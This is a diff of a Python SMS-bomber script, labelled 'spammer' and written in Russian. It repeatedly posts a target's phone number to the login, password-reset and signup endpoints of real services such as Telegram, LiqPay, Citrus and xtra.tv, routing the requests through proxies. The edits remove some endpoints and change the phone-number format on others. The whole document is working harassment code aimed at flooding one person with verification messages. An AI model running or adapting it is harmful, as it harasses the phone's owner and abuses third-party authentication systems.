@@ -51,20 +51,10 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://www.liqpay.ua/apiweb/login/start", json={"token": "1643391525750342_1695506_OLxTT5R4T3W4l72cHAyB", "phone": number}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
-         print('104.ua')
- except:
-         print('Не доставлено (104.ua)')
- try:
          requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
          print('my.ctrs.com')
  except:
          print('Не отправлено my.ctrs.com')
- try:
-         requests.post('https://my.xtra.tv/api/password/restore?lang=uk', data={"phone": "+" + number}, headers=headers, proxies=proxies)
-         print('xtra.tv-pass')
- except:
-         print('Не доставлено (xtra.tv-pass)')
  try:
          requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
          print('telegram')
@@ -91,7 +81,7 @@ for _ in track(range(run)):
  except:
          print('Не отправлено (zolotakoroleva.ua)')
  try:
-     requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': "+" + number, "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
+     requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': number, "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
      print('xtra.tv-service')
  except:
      print('Не доставлено (xtra.tv-service)')
@@ -111,8 +101,8 @@ for _ in track(range(run)):
  except:
          print('Не отправлено (azurewebsites.net)')
  try:
-         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": "+" + number}, headers=headers, proxies=proxies)
-         print('my.xtra.tv-signup')
+         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
+         print('my.xtra.tv')
  except:
          print('Не отправлено (my.xtra.tv)')
  try:
